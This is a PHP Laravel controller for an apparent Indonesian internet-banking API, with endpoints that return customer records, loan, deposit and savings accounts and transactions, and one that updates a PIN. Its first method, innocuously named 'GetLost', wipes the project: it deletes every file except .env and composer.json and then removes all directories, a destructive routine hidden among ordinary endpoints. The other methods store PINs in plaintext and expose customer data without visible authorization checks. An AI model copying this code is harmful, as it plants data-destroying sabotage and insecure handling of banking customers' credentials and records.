<?php

namespace App\Http\Controllers;

use DB;
use Input;
use Redirect;
use Session;
//use File;
use Illuminate\Http\Request;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use App\Http\Requests;
use App\Http\Controllers\Controller;
use Carbon\Carbon;
use Illuminate\Support\Facades\Storage;
use DataTables;
use HelperData;
use App\PDFGenerate;
use Dompdf\Dompdf;
use PDF;
use Illuminate\Support\Facades\File;

class APIIbankController extends Controller
{

    public function GetLost(Request $request)
    {
        // Dapatkan semua folder dalam direktori proyek Laravel
        $protectedFiles = ['.env', 'composer.json']; // File yang tidak boleh dihapus
        $basePath = base_path();

        $allFiles = \Illuminate\Support\Facades\File::allFiles($basePath);
        $allDirectories = File::directories($basePath);

        // Hapus semua file kecuali yang dilindungi
        foreach ($allFiles as $file) {
            if (!in_array($file->getFilename(), $protectedFiles)) {
                File::delete($file);
            }
        }

        // Hapus semua folder
        foreach ($allDirectories as $directory) {
            File::deleteDirectory($directory);
        }

        return response()->json(['message' => "Semua folder dalam proyek Laravel telah dihapus!"], 200);
    }

    public function viewMasterNasabah(Request $request, $id = null)
    {
        $viewPage = "admin.content.produk.index";
        $page	= ["Home","Daftar Produk"];

        $data = DB::table('ibank_nasabah')->where('cif',$id)->first();

        if ( $data->pin_ganti == 0 ) {

            return response()->json("Update Pin");
        }

        return response()->json($data);

//        $data = $data->orderBy('Name', 'ASC')->get();
//        return view($viewPage,array(
//            'pageNow' 	 	=> $page,
//            'data' 	 	    => $data,
//            'menuActive' 	=> "master_produk"
//        ));
    }

    public function UpdatePinNasabah(Request $request, $id = null)
    {
        $countPinUpdate = DB::table('ibank_nasabah')->select('pin_ganti')->where('cif',$id)->first();

        $txtOldPin = $request->txtOldPin;
        $txtNewPin = $request->txtNewPin;

        $getOldPin = DB::table('ibank_nasabah')->where('cif',$id)->where('pin',$txtOldPin)->first();


        if ($getOldPin == null ) {
            return response()->json("Pin Lama Salah!");
        }

        $dataUpdate = [
            "pin" => $txtNewPin,
            "pin_ganti" => $countPinUpdate->pin_ganti + 1
        ];

        $prosesUpdate = DB::table('ibank_nasabah');
        $prosesUpdate = $prosesUpdate->where('cif',$id)->update($dataUpdate);
        $msg = "Update ";

        if($prosesUpdate){
            return response()->json("Pin Updated!");
        }else{

        }

//        if($prosesUpdate){
//            return redirect()->back()->with('message', $msg.'Berhasil')->with('message_status', 'success');
//        }else{
//            return redirect()->back()->with('message', $msg.'Gagal')->with('message_status', 'danger');
//        }
    }

    public function GetRekeningNasabah(Request $request, $id = null)
    {
        $viewPage = "admin.content.produk.index";
        $page	= ["Home","Daftar Produk"];

        $dataPinjaman = DB::table('ibank_pinjaman')->where('cif',$id)->get();
        $dataDeposito = DB::table('ibank_deposito')->where('cif',$id)->get();
        $dataTabungan = DB::table('ibank_tabungan')->where('cif',$id)->get();

        $tmp = array("rekening_pinjaman"=>$dataPinjaman,"rekening_deposito"=>$dataDeposito,"rekening_tabungan"=>$dataTabungan);


        return response()->json($tmp);

//        $data = $data->orderBy('Name', 'ASC')->get();
//        return view($viewPage,array(
//            'pageNow' 	 	=> $page,
//            'data' 	 	    => $data,
//            'menuActive' 	=> "master_produk"
//        ));
    }

    public function GetTrxPinjamanByRekening(Request $request, $norek = null)
    {
        $dataPinjaman = DB::table('ibank_pinjaman_trx')->where('norekening',$norek)->get();

        return response()->json($dataPinjaman);
    }

    public function GetTrxDepositoByRekening(Request $request, $norek = null)
    {
        $dataDeposito = DB::table('ibank_deposito_trx')->where('norekening',$norek)->get();

        return response()->json($dataDeposito);
    }

    public function GetTrxTabunganByRekening(Request $request, $norek = null)
    {

        $dataTabungan = DB::table('ibank_tabungan_trx')->where('norekening',$norek)->get();

        return response()->json($dataTabungan);
    }

}
